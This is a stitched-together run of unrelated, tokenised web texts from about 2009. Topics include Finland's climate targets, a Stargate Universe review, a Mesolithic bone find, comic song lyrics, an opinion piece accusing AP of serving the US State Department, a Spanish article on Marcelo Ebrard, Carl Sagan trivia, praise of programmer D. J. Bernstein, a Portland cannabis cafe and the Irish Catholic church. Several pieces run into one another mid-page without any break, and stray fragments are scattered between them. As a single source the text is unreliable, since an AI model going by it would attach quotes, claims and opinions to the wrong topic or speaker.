HELSINKI , Oct 15 ( Reuters ) - Finland aims to cut greenhouse gases by 80 percent or more from 1990 levels by 2050 , the government said on Thursday in a report outlining its long - term climate and energy policy .
“ Unmitigated climate change may result in immense human suffering and destroy ecosystems , ” the Finnish government said in a statement 52 days before governments meet in Copenhagen to try to agree a new global climate accord .
“ To minimise the risks and harm , the government supports efforts to limit global warming over the period ( to 2050 ) to two degrees Celsius at most , ” it said .
In its energy strategy last year , Finland said it was committed to the European Union ’s target to reduce emissions by 20 percent from 1990 levels by 2020 and to boost the share of renewable energy to 38 percent from around 30 percent currently .
Finland had also backed EU aims requiring 60 - 80 percent emission cuts from industrialised countries by 2050 compared to 1990 levels , but it had no fixed target for 2050 before .
Its new report said a long - term shift to a low - carbon society would require , among other things , revised energy standards in building and renovation work and adjustments in environmental taxation .
“ The target of the Foresight Report is a shift to a thriving low - carbon society in which emissions have been reduced by at least 80 percent from the 1990 level by 2050 as part of a wider international effort , ” Finland said .
“ In practice , the achievement of emission reductions in Finland requires virtually zero-emission energy and road transport sectors in the long term , ” the government said .
It added that developed and emerging economies would need to bear their own share of the responsibility , but Finland would help to seek funding for poorer countries ’ efforts to cope with climate change .
The report set out scenarios showing that emissions would be curbed by boosting energy efficiency in all sectors , increasing the use of low - carbon technology and renewable energy , and through carbon capture storage ( CCS ) and nuclear power .
Governments are due to convene a U.N. climate conference in the Danish capital on Dec. 7 - 18 to try to reach a climate deal to replace provisions of the Kyoto Protocol expiring in 2012 .
The talks have stalled over how to share the costs of meeting the climate challenge between rich and poor nations and on the size of industrialised countries ’ emissions cuts .
“ Finland will actively work towards reaching a comprehensive and ambitious agreement in climate negotiations and pursue the integration of climate issues in foreign policy and international cooperation , ” the government said .

Whoops !
Some six years after performing his infamous “ Top Gun ” - inflected “ Mission Accomplished ” press stunt aboard the USS Abraham Lincoln , former President George W. Bush let fly with quite a telling gaffe during a talk he gave Thursday to the Montreal Board of Trade .
— KA
The Vancouver Sun :
Bush defended his decisions to invade Afghanistan and Iraq and to bail out Wall Street with taxpayers ’ money .
Asked whether he would reconsider any of his decisions , Bush brought up his failure to complete immigration and social security reform and his handling of the Hurricane Katrina crisis in 2005 .
“ I spend a lot of time thinking about Katrina , and whether I could have sent in the federal troops right away , even though it was against the law , ” he said .
While Bush ’s speech was mostly eloquent and free of the language gaffes he admits he is famous for , he said he regretted appearing in front of a “ Mission Impossible ” sign during a televised address in 2003 .
The controversial banner referring to the U.S. mission in Iraq , actually said “ Mission Accomplished . ”

I want to preface this by saying that I am a huge fan of the Stargate franchise .
I 've watched every episode of Stargate SG - 1 multiple times and I probably know more about the show than any other show , The X - Files included .
I 've watched all of Stargate Atlantis though not as avidly , so I have a predisposition to Stargate that may introduce bias into my review .
I 'll try to stay objective and view this as just another show , but seeing some of the old characters brought out lots of nostalgic feelings .
First Daniel Jackson ( Michael Shanks ) came , then Samantha Carter ( Amanda Tapping ) , Walter Harriman ( Gary Jones ) , the second greatest Stargate character ( behind Teal'c of course ) , Jack O'Neill ( Richard Dean Anderson ) , and lastly Dr. Bill Lee ( Bill Dow ) .
The opening scene starts in medias res and is very chaotic with people jumping through the gate on top of each other .
It 's nicely done , but felt too stylized .
The shaking camera and screams seemed canned and did n't fully convey the enormity of the situation .
In fact the whole episode felt too focused on a dark tone and total disorder instead of the characters and story .
The episode switches between the ship and the progression of Eli Wallace 's ( David Blue ) discovery in a video game to a spaceship and then to the Icarus base where they had hope to use the 9th chevron .
While the absurdly pompous senator played by Christopher McDonald ( think Barney Frank on steroids ) is giving an equally absurd toast , the base comes under attack from the Lucian Alliance which is a nice extension to SG - 1 .
I was confused how the Lucian Alliance managed to get enough Death Gliders and Al 'kesh to mount an attack since they were in shambles last time we saw them .
I was also confused how they could n't pick up the Ha'taks on sensors .
The base cannot hold off the attack and since Dr. Rush activated the 9th chevron , they go on in .
The episode switches between the ship is apparently traveling faster than light yet not through hyperspace .
The ship 's life support system is n't working and there is still no clear hierarchy or even a sense of order .
There is a moment of tension when Ronald Greer ( Jamil Walker Smith ) turns his gun on Nicholas Rush ( Robert Carlyle ) which was completely random and made me hate Ronald immediately .
Greer was in detention before , so he 's probably trouble .
Searching for life support , Rush and Wallace discover they are several billion light - years from home .
Dr. Rush takes these devices which let him control people back on Earth to talk to O'Neill who appoints him the leader .
He tries to impose order , but is shouted down .
While the story of the episode is to regain life support , it is punctuated many times by constant reinforcement that their situation really sucks , humans are n't perfect , and oh yeah , their situation sucks .
The ship is saved after the sacrifice by the senator ( a positive since he was annoying ) and all the well for now ( not really ... ) .
Everett Young ( Justin Louis ) is the military guy in charge and does n't like Rush much .
I 'm not going to go over the other characters since none of them really set themselves apart .
As the series progresses , I 'll bring them up .
Why do new shows need 2 - hour series premieres ?
They do n't .
The premiere of Warehouse 13 was unnecessarily long and the premiere of Stargate Universe seemed too long .
It 's difficult to sit for 2 hours of the same show .
The next time someone wants a longer series premiere , I would recommend an hour and a half .
It would allow for a good set - up while keeping people interested .
Stargate Universe may end of being a great show with depth and complexity , but so far all it is is a show with good visual / special effects , cool sets , and a very dark tone .
Syfy is trying to pander to a new audience , but I 'm afraid they may lose their existing fans .
While the Stargate still remains a force in this new series , SGU is vastly different than SG - 1 or SGA .
There is n't really any upbeat moments or humor .
I will keep watching and while the concept is very interesting , the scripts must be beefed up .

Kents Cavern has a long history of human occupation A fragment of bone from a Devon cave may hint at cannibalism by early Britons , according to archaeologists .
Researchers say the 9,000 - year - old bone carries cut marks made by a stone tool which are consistent with the act of dismemberment .
Scientists believe the bone is evidence that Britons from the Mesolithic period engaged in complex burial rituals and possibly cannibalism .
Human remains from this period are extremely rare in Britain .
The bone was found at Kents Cavern in the late 19th century and was being stored at Torquay museum where curator Barry Chandler noticed the cut marks on it .
He showed the bone to Dr Rick Schulting from Oxford University who concluded that it belonged a human adult .
Dr Schulting told BBC
News : " The cuts are along the top of the ulna , the top of the bone of the lower arm , right at the elbow .
They look like they 're made by stone tools rather than metal tools . "
" They 're just a series of fine parallel cuts as though you 're trying to dismember , to remove the lower arm . "
" The person must have been already dead at this time .
So you 're looking at post - mortem dismemberment for some reason . "
Dr Schulting says the marks could be evidence of a complex mortuary treatment .
Or , he says , " the other possibility is that this is done for quite another reason , the consumption of the individual as part of cannibalism . "
Fresh break
The bone is also fractured and according to scientists this probably happened when it was still fresh , which might provide some support for the cannibalism theory - but Dr Schulting urges caution .
Carbon dating put the bone in the Mesolithic period , between the end of the last Ice Age and the start of farming .
Dr Schulting hopes to resolve the cannibalism question by searching Kents Cavern for other human and animal bones remains from this period to see if they were treated in the same way .
Dr Silvia Bello , a palaeontologist at London 's Natural History Museum , told BBC News : " Cannibalism amongst [ Homo ] sapiens and pre-sapiens humans has always been a taboo topic .
Whilst the presence of cut marks on faunal remains is usually referred to as a direct manifestation of butchery activities , cut marks on human remains are not usually considered to be un-equivocal evidence of cannibalism .
" The presence of butchery cut marks on human remains is generally interpreted as ritual practice , such as de-fleshing , scalping , dismembering , without consumption of the body .
However , although difficult to prove , cannibalistic practices cannot be completely dismissed . "
" The newly described human remains from Kent 's Cavern are clearly an important development in the reconstruction of the complex funerary behaviour of Mesolithic people in Britain . "
In the UK , the only other bones with cut marks were discovered in Gough 's Cave , Somerset and are 5,000 years older .
This bone was dug up by in 1866 by archaeologist and geologist William Pengelly .
He discovered it in the upper levels of Kents Cavern which are less studied than the lower levels as the items here are generally more recent .
It was being stored alongside some fragments of animal bone from the same area when Barry Chandler spotted it .
He was surprised that the carbon dating showed it as being so much older than the rest of the collection which are from the Bronze Age or late Neolithic era .

Should I sell my Porsche stocks ?
[ popup.lala.com ]
I woke up this morning with a bad hangover
And my penis was missing again .
This happens all the time .
It 's detachable .
[ background singing begins : " detachable penis " over and over ]
This comes in handy a lot of the time .
I can leave it home , when I think it 's gonna get me in trouble ,
or I can rent it out , when I do n't need it .
But now and then I go to a party , get drunk ,
and the next morning I can't for the life of me
remember what I did with it .
First I looked around my apartment , and I could n't find it .
So I called up the place where the party was ,
they had n't seen it either .
I asked them to check the medicine cabinet
' cause for some reason I leave it there sometimes
But not this time .
So I told them if it pops up to let me know .
I called a few people who were at the party ,
but they were no help either .
I was starting to get desperate .
I really do n't like being without my penis for too long .
It makes me feel like less of a man ,
and I really hate having to sit down every time I take a leak .
After a few hours of searching the house ,
and calling everyone I could think of ,
I was starting to get very depressed ,
so I went to the Kiev , and ate breakfast .
Then , as I walked down Second Avenue towards St. Mark 's Place ,
where all those people sell used books and other junk on the street ,
I saw my penis lying on a blanket
next to a broken toaster oven .
Some guy was selling it .
I had to buy it off him .
He wanted twenty - two bucks , but I talked him down to seventeen .
I took it home , washed it off ,
and put it back on .
I was happy again .
Complete .
People sometimes tell me I should get it permanently attached ,
but I do n't know .
Even though sometimes it's a pain in the ass ,
I like having a detachable penis .
Associated Press again steers Americans wrong on Iran
By Peter Duveen
Analysis
PETER'S NEW YORK , Friday , October 23 , 2009 -- In its most reccent talks with Iran over nuclear fuel issues , the West obviously included a requirement it knew Iran would reject -- that the country 's nuclear fuel , refined by Russia , would then be shipped to France to be shaped into fuel rods .
Iran had shown its disfavor for any involvement by France .
This , of course , highlights a typical technique of the West -- to include a provision it knows Iran will reject , so it can say that it has rejected the draft document , etc .
This is the same technique the West used to invade Afghanistan -- by demanding , without proof of wrongdoing , that the Taliban turn over Osama Bin Laden .
The same mode was employed in its justification for the bombing of Belgrade , Yugoslavia , when it made demands of Slobodan Milosevic that would have basically made his country a vassal state of NATO .
The two examples are among many that could be cited as a well - honed but now transparently insincere approach by Western nations , led by the United States , in their negotiations .
Even if it is true that it would cost more for Iran to refine its own nuclear fuel than to purchase it from the outside , as some analysts state , it is natural for the country to want to have its own production capacity for national security reasons .
In other words , it would want to be able to guarantee its own supply in the event the international community decided not to honor its agreements to supply nuclear fuel .
The fact that an Associated Press story highlighted Iran 's faillure to approve the current state of the most recent negotiating package , but did not mention the requirement that France manufacture the fuel rods until the fourteenth paragraph of an eighteenth paragraph story , is a clear testament to the fact that AP is firmly in the hands of the U.S. State Department and has become a mere organ of the federal government and its intelligence agencies .
It has , in practice , long ceased to act as an independent source of vigorous journalism .
That the large majority of news organizations throughout the U.S. continue to rely on AP as a source for its international news demonstrates how the U.S. government has succeeded in keeping a short leash on the American press .
The latest AP story on the negotiations , as of this morning , entitled " Iran fails to accept UN uranium enrichment plan , " attempted to lay the blame for Iran 's failure to approve the plan on another issue .
" Iran on Friday failed to accept a U.N. - drafted plan that would ship most of the country 's uranium abroad for enrichment , saying instead it would prefer to buy the nuclear fuel it needs for a reactor that makes medical isotopes , " read the lead .
Of course the lead makes little sense , as it is totally unclear how Iran 's interest in purchasing nuclear fuel rather than producing it would have undermined negotiations .
AP indicates that , on this particular point , Iran would rather use an existing reactor for its production of medical sources for radioactivity and buy fuel for it , rather than make an expensive purchase of a new reactor for the purpose .
In other words , Iran must pay a price , that of a new reactor , for a new agreement to be approved .
However , a visit to the original story by AP found it to be considerably shortened , and left out this element in its second version .
AP then editorializes :
" The response will come as a disappointment to the U.S. , Russia and France .. " , lumping Russia together with the other two players , as if they somehow form a united front , which , of course , they do not .
Russia and China has always resisted the imposition of sanctions on Iran .
It then admits , in contradistinction to its misleading headline , that " Iran did not reject the plan outright , " but then tells us that " Iran has often used counterproposals as a way to draw out nuclear negotiations with the West , " as if the country is simply supposed to accept any plan laid before it , doing otherwise being evidence of stonewalling .
One has to ask AP what its " journalists " or " editors , " as the case may be , think negotiations are for .
The Reuters story was much the same as the AP story , and one would have to go to another source , such as Russia Today , to find out the obvious facts .
The Russia Today article posted today on its website is entitled " Iran wants Russian enriched uranium , " and contains the obviously missing information .
" Tehran says France and the US will not be able to participate in the project directly , Interfax reports , quoting Ali Asghar Soltanieh , a representative of the Iranian delegation . "
The last paragraph of the same article complements this information :
" Meanwhile , the French Foreign Ministry issued a statement saying France 's participation is a vital part of the enrichment process . "
Now might this have something to do with Iran 's reluctance to approve the agreement ?
The fact that the large majority of news organizations throughout the U.S. continue to rely on AP as a source for its international news demonstrates how the U.S. government has been successful in keeping the American press on a short leash .
Durante un ciclo de diálogos organizado por El Colegio de México , denominado  ¿A dónde va la izquierda ? , Ebrard no dijo que él podría ser ese candidato de unidad , pero argumentó que la única manera de designar a ese abanderado es a través de encuestas y no con una elección interna
[ email protected ]
Ayer , ante estudiantes y profesores de El Colegio de México , Marcelo Ebrard mostró la faceta del aspirante presidencial .
Por dos horas y envuelto en esta última , se refirió a la izquierda mexicana , de lo que avizora para 2012 .
Consideró que la opción para ganar la Presidencia de la República es que esa izquierda impulse a un candidato único .
Durante un ciclo de diálogos organizado por El Colegio de México , denominado “ ¿A dónde va la izquierda ? ” , Ebrard no dijo que él podría ser ese candidato de unidad , pero argumentó que la única manera de designar a ese abanderado es a través de encuestas y no con una elección interna , por la experiencia que este último proceso dejó en el PRD .
“ Si no se tiene la capacidad de poder construir una candidatura creíble para 2012 , si llegamos con más de un candidato , si repetimos lo que ocurrió en 2008 ( con las elecciones internas perredistas ) , bueno , pues entonces nos vemos en la década que sigue ” , advirtió Marcelo Ebrard .
Como aspirante presidencial confeso , el perredista lamentó que la crisis de ese partido los haya dejado con tan sólo 12 % de la votación nacional durante los pasados comicios de julio .
“ Todas las hipótesis que se construyeron por los diferentes componentes resultaron un error mayor .
La realidad derrotó todas esas hipótesis , de que podría construirse el futuro sin los demás ” , expuso el mandatario de la ciudad de México .
Pero a pesar de lo fragmentada que hoy está la izquierda , consideró que no hay condiciones para crear un nuevo partido político , y argumentó que además de la candidatura única se debe lograr una coordinación mayor e impulsar una estrategia construida a partir de tres ejes .
A través del primero de ellos , explicó , la izquierda mexicana debe lograr la representación de todos aquellos grupos que hoy están excluidos del modelo de organización nacional .
También planteó la adopción de nuevas causas como banderas de la izquierda , así como impulsar una modernización integral .
“ Buscamos ser la fuerza modernizadora que limite el poder de intereses particulares ” , agregó Marcelo Ebrard .
Los intereses privados
El jefe de Gobierno criticó el paquete fiscal recientemente aprobado , sobre todo por la manera como lo avaló el Congreso de la Unión .
Además , acusó la intervención de interés privados en el sentido de la decisión que tomaron los legisladores federales .
“ Las leyes se hacen al ‘ contentillo ’ , las decisiones estratégicas del Estado mexicano se consultan y se litigan fuera de oficinas públicas .
Ya casi nos acostumbramos , todos los días lo vemos , ahora hasta la Ley de Ingresos también .
Hay que ir a otras oficinas a preguntar si así está bien , si están de acuerdo y qué les parece ” , planteó Ebrard .
Lamentó así la prevalencia de los intereses privados que permite proponer o impulsar nombramientos de funcionarios de alto nivel y hasta de diputados .
“ Tenemos un enorme número de funcionarios y ex funcionarios con información privilegiada formados en el Estado mexicano que , como no hay ningún esquema regulado o pensado , acaban trabajando para las empresas , empezando por el famoso doctor ( Ernesto ) Zedillo , con el debido respeto ” , expresó el jefe de Gobierno del Distrito Federal .
Por momentos irónico , enumeró los que desde su punto de vista son algunos de los grandes fracasos de la derecha del país .
Uno , dijo , es la política en materia educativa , por el rezago en el que se encuentra , pero también el manejo de Pemex a pesar de un boom en el precio del crudo que en el sexenio pasado generó 70 mil millones de dólares de ingresos adicionales al erario .
En materia de seguridad , se refirió a la Iniciativa Mérida , suscrita con Estados Unidos , como un mecanismo que supeditó las decisiones de combate al narcotráfico a nuestro vecino del norte .
From the country that brought us rugby and soccer comes one of the oldest , hardest and weirdest ball games in the world , the Eton Wall Game .
It ’s not clear when the Eton Wall Game was invented , but the first recording of a game dates back to 1766 .
Its rules were changed several times up to 1849 , but have remained unchanged ever since .
The game originated at Eton college , along a slightly crooked brick wall , built in 1717 .
The most important game is played on St. Andrew ’s Day , between a team of Collegers and Oppidants .
People kicking a ball along a brick wall sounds a little like soccer , but the 5 - meters wide , 110 - meters - long pitch makes the Eton Wall Game special .
Each ten - player team tries to get the ball to the far end of the opposite side and score a goal , without handling the ball , hold or hit their opponents or get caught offside .
As you can imagine , scoring a goal under these conditions can be rather difficult .
In fact , the last one was scored 100 years ago , in 1909 .

The delivery of the Core i7 - based iMacs have generated the usual discussion threads about unboxing , impressions and benchmarks .
The performance of the high - end iMacs have been of particular interest due to the new incorporation of desktop - class processors into Apple 's consumer line .
Various Geekbench and Cinebench scores for the new i7 iMacs have been reported .
The best visual representation is provided by this blog entry at Timon - Royer.com which compiled the Geekbench scores across all currently shipping iMacs :
Longer bars are better with the new i7 iMac ( green ) performing significantly better than the Core 2 Duo 21.5 " iMacs .
The i7 even represents a sizable ( 35 % ) performance increase over the i5 model and costs only $ 200 more .
In fact , the i7 iMac benchmarks compare favorably to 2.93 Ghz Quad - Core Mac Pro which costs significantly more .
Update : Timon Royer has updated his blog post with a new chart correcting a minor error on the Core i5 - based iMac data and adding results for the latest Mac Pro models for comparison purposes .

I miss Carl Sagan .
Sagan 's enthusiasm for science and his knack for translating difficult scientific concepts into simple explanations that many can understand , made him a popular figure .
He was an ambassador for science , if you will , as he had inspired many people to study science ( yours truly included ) .
Today would 've been his 75th birthday , so in honor of the great astronomer , scientist and author , Neatorama presents 10 Neat Facts About Carl Sagan :
1. Carl Sagan's First Book About Stars
When Carl was five years old , he wondered about the stars : what were they ?
Unsatisfied with the answers he got from his friends and from adults he knew , Carl went to the library and asked for a book about stars .
The librarian handed him ... a book on celebrities !
In Keay Davidson 's Carl Sagan : A Life , Carl explained how his fascination with the cosmos began :
I gave it back to her and said , " This was n't the kind of stars I had in mind . "
She thought this was hilarious , which humiliated me further .
She then went and got the right kind of book .
I took it — a simple kid's book .
I sat down on a little chair — a pint - sized chair — and turned the pages until I came to the answer .
And the answer was stunning .
It was that the Sun was a star but really close .
The stars were suns , but so far away they were just little points of light ....
And while I did n't know the [ inverse ] square law of light propagation or anything like that , still , it was clear to me that you would have to move that Sun enormously far away , further away than Brooklyn [ for the stars to appears as dots of light ] ....
The scale of the universe suddenly opened up to me .
[ It was ] kind of a religious experience .
[ There ] was a magnificence to it , a grandeur , a scale which has never left me .
Never ever left me .
2. Sagan vs. Apple
In 1994 , Apple chose the internal codename " Carl Sagan " for its PowerMac 7100 .
Though it was meant as an homage to Carl ( and an in - joke that the computer would make Apple " billions and billions " of dollars ) , they also used the codenames " Piltdown Man " and " Cold Fusion " for the Power Mac 6100 and 8100 , respectively .
When Carl found out that he was being put alongside scientific hoaxes , he sued Apple .
Though Apple won the suit , the codename was changed to BHA ( Butt Head Astronomer ) ... which prompted yet another lawsuit from the p.o. 'd astronomer !
Apple won again , but their lawyers demanded the engineers change the codename one more time , which they did .
The PowerMac 7100 was known by its final codename LAW , which stood for " Lawyers Are Wimps . "
3. Spaced Out ... On Pot !
In 1969 , Carl Sagan wrote under the Pseudonym " Mr. X " about the virtues of cannabis .
Harvard Medical School Professor Emeritus of Psychiatry Lester Grinspoon has the article in his website Marijuana Uses :
It all began about ten years ago .
I had reached a considerably more relaxed period in my life - a time when I had come to feel that there was more to living than science , a time of awakening of my social consciousness and amiability , a time when I was open to new experiences .
I had become friendly with a group of people who occasionally smoked cannabis , irregularly , but with evident pleasure .
Initially I was unwilling to partake , but the apparent euphoria that cannabis produced and the fact that there was no physiological addiction to the plant eventually persuaded me to try .
My initial experiences were entirely disappointing ; there was no effect at all , and I began to entertain a variety of hypotheses about cannabis being a placebo which worked by expectation and hyperventilation rather than by chemistry .
After about five or six unsuccessful attempts , however , it happened .
I was lying on my back in a friend 's living room idly examining the pattern of shadows on the ceiling cast by a potted plant ( not cannabis ! ) .
I suddenly realized that I was examining an intricately detailed miniature Volkswagen , distinctly outlined by the shadows .
I was very skeptical at this perception , and tried to find inconsistencies between Volkswagens and what I viewed on the ceiling .
But it was all there , down to hubcaps , license plate , chrome , and even the small handle used for opening the trunk .
When I closed my eyes , I was stunned to find that there was a movie going on the inside of my eyelids .
Flash . . . a simple country scene with red farmhouse , a blue sky , white clouds , yellow path meandering over green hills to the horizon .

Flash . . .
4. The Politics of Science
Anyone who has ever worked in a university or an academic institution would know this , but most people assume that because science relies on logic and careful reasoning , scientists would behave in a clinical and dispassionate way .
Nothing is farther from the truth .
Carl 's popularity had backfired on him not once but twice .
In 1967 , he was denied tenure at Harvard because his colleagues bristled at " what they perceived as self - aggrandizement and pandering to the public . "
In 1992 , Carl was again disappointed when his application for membership at the prestigious National Academy of Sciences was denied .
Ironically , he received the Public Welfare Medal , the highest award of the Academy for " distinguished contributions in the application of science to the public welfare . "
In both instances , Carl persevered and succeeded to overcome setbacks resulting from the politics of science .
5. Billions and Billions
Carl Sagan actually never used the term " billions and billions . "
His exact words on the series Cosmos were " billions upon billions " ( which , for all practical purpose , is pretty much the same thing ) .
So how did " billions and billions " came to be ?
We can blame Johnny Carson :
[ YouTube Clip ]
Carl was a good sport - his final book , titled Billions & Billions : Thoughts on Life and Death at the Brink of the Millennium , opened with a tongue - in - cheek discussion of the catch phrase and noted that Johnny Carson himself was an amateur astronomer .
6 . The Sagan Unit
A sagan is defined as at least 4 billion ( the smallest amount in " billions " is two billion , so " billions and billions " equal 4 billion ) .
It is estimated that the Milky Way galaxy has 100 sagan ( 400,000,000,000 ) stars .

7. Pioneer Plaques
Many people know that Pioneer 10 and Pioneer 11 spacecrafts carry metal plaques that carry a message from mankind .
But not many know that it was Carl Sagan , together with Frank Drake ( yes , the man who came up with the Drake Equation that attempts to estimate the number of alien civilization in our galaxy ) , that designed the plaque .
The controversial artwork , which featured a nude man and woman , was drawn by Sagan 's then - wife Linda Salzman Sagan .
After the Pioneer Program , NASA put a Golden Record aboard the two Voyager spacecrafts , which included a greeting " Hello from the children of planet Earth . "
That was recorded by then six - year - old Nick Sagan , Carl 's son .
8. Carl Sagan Memorial Station ... on Mars !
Nick Sagan grew up to become a novelist and screenwriter .
He wrote an episode of Star Trek : Enterprise titled " Terra Prime , " which included a CGI of Carl Sagan Memorial Station plaque on Mars .
Image via Memory Alpha , the Star Trek Wiki
The plaque above is fictional - but the Carl Sagan Memorial Station is real .
It 's the formal name of the NASA Mars Pathfinder lander , which delivered the Sojourner rover that explored the Red Planet .
9. Sagan Asteroid
Just in case a unit of measurement and a memorial station on Mars are n't enough , Carl had another thing named after him : a small asteroid in the main asteroid belt between Mars and Jupiter was named the 2709 Sagan .
10 . Sagan 's Last Interview
In 1996 , not long before his death , Carl Sagan was interviewed by Charlie Rose , in which he discussed the rise of pseudoscience in the United States .
He looked gaunt in the interview , but as you can see , he remained as sharp as ever :

I 'll be the first to acknowledge that this is a woefully inadequate post about one of the most brilliant scientists who ever lived .
We did n't talk about Cosmos ( because it 's so popular , I opted for the more obscure Sagan trivia ) , his books and Pulitzer Prize , Carl Sagan Day and so on .

We are used to think that advertising is something that gives us some time to go to the bathroom while watching a TV show or a movie .
But should all advertising be so ?
Not at all !
I bet advertising could be so cool and creative that you would better pee your pants than miss it .
For panda , the best advertising type is Ambient .
Why ?
Because it is integrated into our natural surroundings , and catch our attention in places where we least expect to .
Sorry for the first one , but hey , I bet you are so bored , that only the ass toilet paper dispenser can wake you up .
Bored Panda is proud to present this wonderful list of 33 cool and creative ambient ads .

djb
日本語
I think it ’s time to remind people that D. J. Bernstein is the greatest programmer in the history of the world .
First , look only at the objective facts .
djb has written two major pieces of system software : a mail server and a DNS server .
Both are run by millions of Internet domains .
They accomplish all sorts of complicated functions , work under incredibly high loads , and confront no end of unusual situations .
And they both run pretty much exactly has Bernstein first wrote them .
One bug — one bug ! — was found in qmail .
A second bug was recently found in djbdns , but you can get a sense of how important it is by the fact that it took people nearly a decade to find it .
No other programmer has this kind of track record .
Donald Knuth probably comes closest , but his diary about writing TeX ( printed in Literate Programming ) shows how he kept finding bugs for years and never expected to be finished , only to get closer and closer ( thus the odd version numbering scheme ) .
Not only does no one else have djb ’s track record , no one else even comes close .
But far more important are the subjective factors .
djb ’s programs are some of the greatest works of beauty to be comprehended by the human mind .
As with great art , the outline of the code is somehow visually pleasing — there is balance and rhythm and meter that rivals even the best typography .
As with great poetry , every character counts — every single one is there because it needs to be .
But these programs are not just for being seen or read — like a graceful dancer , they move !
And not just as a single dancer either , but a whole choreographed number — processes splitting and moving and recombining at great speeds , around and around again .
But , unlike a dance , this movement has a purpose .
They accomplish things that need accomplishing — they find your websites , they ferry your email from place to place .
In the most fantastic movies , the routing and sorting of the post office is imagined as a giant endless choreographed dance number .
( Imagine , perhaps , “ The Office ” from Brazil . )
But this is no one - time fantasy , this is how your email gets sorted every day .
And the dance is not just there to please human eyes — it is a dance with a purpose .
Each of its inner mechanisms is perfectly crafted , using the fewest number of moving parts , accomplishing its task with the most minimal energy .
The way jobs are divided and assigned is nothing short of brilliant .
The brilliance is not merely linguistic , although it is that too , but contains a kind of elegant mathematical effectiveness , backed by a stream of numbers and equations that show , through pure reason alone , that the movements are provably perfect , a better solution is guaranteed not to exist .
But even all this does not capture his software ’s incredible beauty .
For djb ’s programs are not great machines to be admired from a distance , vast powerhouses of elegant accomplishment .
They are also tools meant to be used by man , perfectly fitted to one ’s hand .
Like a great piece of industrial design , they bring joy to the user every time they are used .
What other field combines all these arts ?
Language , math , art , design , function .
Programming is clearly in a class of its own .
And , when it comes to programmers , who even competes with djb ?
Who else has worked to realize these amazing possibilities ?
Who else even knows they are there ?
Oddly , there are many people who profess to hate djb .
Some of this is just the general distaste of genius : djb clearly has a forceful , uncompromising vision , which many misinterpret as arrogance and rudeness .
And some of it is the practical man ’s disregard for great design : djb ’s programs do not work like most programs , for the simple reason that the way most programs work is wrong .
But the animosity goes much deeper than that .
I do not profess to understand it , but I do honestly suspect at some level it ’s people without taste angry and frustrated at the plaudits showered on what they can not see .
Great art always generates its share of mocking detractors .
This is not to say that djb ’s work is perfect .
There are the bugs , as mentioned before , and the log files , which are nothing if not inelegant , and no doubt djb would make numerous changes were he to write the software again today .
But who else is even trying ?
Who else even knows this is possible ?
I did not realize what great art in software could be until I read djb .
And now I feel dirty reading anything else .

Oregon opened another chapter in U.S. marijuana history when at 4:20 p.m.
Friday , about three dozen people christened the nation 's first cafe for licensed residents to sit down , sip coffee and smoke marijuana .
" Welcome to a place of our own , " said Madeline Martinez , a leader in the state 's medical marijuana movement and the leading force pushing to open the Cannabis Cafe in Portland .
" Welcome to freedom . "
Excited patrons spilled down the outside steps at 700 N.E. Dekum St. as the cafe prepared to open at the appointed hour -- " 420 " being slang for using marijuana .
In line were military veterans , grandmothers , young workers , men and women , old and young , black , white and Latino .
Gordon Cederholm , 45 , of Milwaukie has lived with HIV for 25 years and said he was skeptical about using marijuana as medicine when he got his Oregon card less than a year ago .
" At first , I thought :
What does being a pothead have to do with it ? ' " he said .
" I did n't know the benefits in marijuana .
Now , I find that I 'm a better person when I smoke . "
Kris Koa , 57 , a retired nurse from Gresham , rode the bus from home to see the cafe for herself .
She has been using medical marijuana for fibromyalgia and rheumatoid arthritis .
This cafe means I now have the freedom to take my own health into my own hands , " she said .
" This is just the most fabulous thing to happen . "
The cafe , in the space that once featured Rumpspankers restaurant , looks like nearly every other coffeehouse in town , except that shiny silver Volcano vaporizers are plugged into outlets lining the tiled bar .
Wi - Fi is available .
Coffee , soft drinks , trays of Marsee Bakery pastries and sandwiches are also offered as ammunition against the inevitable attack of the munchies .
The only people permitted in the Cannabis Cafe are those licensed to smoke who also hold membership in the lobbying groupOregon NORML .
Patrons will be charged $ 5 a day .
They can bring their own or smoke donated marijuana .
Oregon law says medical marijuana may not be sold .
Before the opening , Martinez unloaded a large box with a dozen jelly jars full of marijuana of various strains that had been donated to the cafe .
She opened one jar and held it out for a sniff ; the contents smelled sweet , even fruity .
" It 's called Blueberry , " Martinez said , smiling .
" It 's really good for pain . "
The cafe had long been a dream of Martinez , executive director of Oregon 's chapter of the National Organization for the Reform of Marijuana Laws .
But long - standing fears of federal arrest " kept us ostracized and turned us into criminals just for using our medicine . "
Then last month , Attorney General Eric Holder announced that authorities would no longer prosecute licensed users in the 13 states with medical - marijuana programs .
Oregon 's 10 - year - old program is the second in the nation , after California's .
Giving heart to smokers this week was the American Medical Association 's change of position on marijuana :
Having proclaimed for years that it had no medicinal value , the AMA instead said marijuana does have benefits that warrant further study .
In Oregon , more than 23,000 people hold medical - marijuana cards and another 14,000 are registered as caregivers or growers .
The overwhelming majority of patients are treating chronic severe pain .
For about a year , Oregon NORML has hosted twice - monthly meetings of cardholders on the second floor of the Northeast Dekum Street building .
Eric and Shelly Solomon , who ran the now - closed Rumpspankers , offered the downstairs restaurant space for the cafe .
After last week 's announcement of the cafe 's opening , the neighbors in the Woodlawn neighborhood were n't happy .
At a crowded neighborhood association meeting , people complained , among other things , that they could smell smoke from the meetings .
Martinez promised to install air filters .
Friday afternoon , patients made themselves comfortable on the soft furniture .
" Budtenders " at the bar ground up small portions of marijuana for the vaporizers .
A cafe volunteer went to the cafe 's front door and opened it for a woman in a wheelchair .
A seemingly unending wave of sex scandals , many of them involving children , has decimated the once - proud standing of the Catholic church in Ireland and rendered its power a pale shadow of what it was .
The church was almost bound to lose influence over the last half - century , in common with a western world where the secular is generally prevailing against the religious .
But in Ireland its fall from grace has been dramatic and drastic .
Download the new Independent Premium app Sharing the full story , not just the headlines
Church attendance is on the wane , with only a handful of people now come forward each year to train as priests or nuns - this in a country which for decades sent thousands of religious abroad .
In the archdiocese of Dublin there will soon be barely enough to have one priest for each of its 199 parishes .
Clerical presence is not only contracting but ageing : in Dublin there are now ten times more priests over 70 than under 40 .
The heart of the trouble lies in the mind of the flock , for even the most faithful have been shocked to the core by the relentless revelations .
That shock has been all the greater because of the reverence which the church once commanded .
When what is now the Irish Republic came into being in the early 1920s , after Britain withdrew from the 26 southern counties , the new state was more than 90 per cent Catholic .
From the start it depended heavily on the Catholic church to provide much of its basic infrastructure .
In many ways the church provided a service which tended to the faithful from the cradle to the grave but also at many points in - between , since it ran most of the schools and many of the hospitals and other services .
It set the tone for the entire state , since Catholic doctrine was built into many laws , including the Constitution .
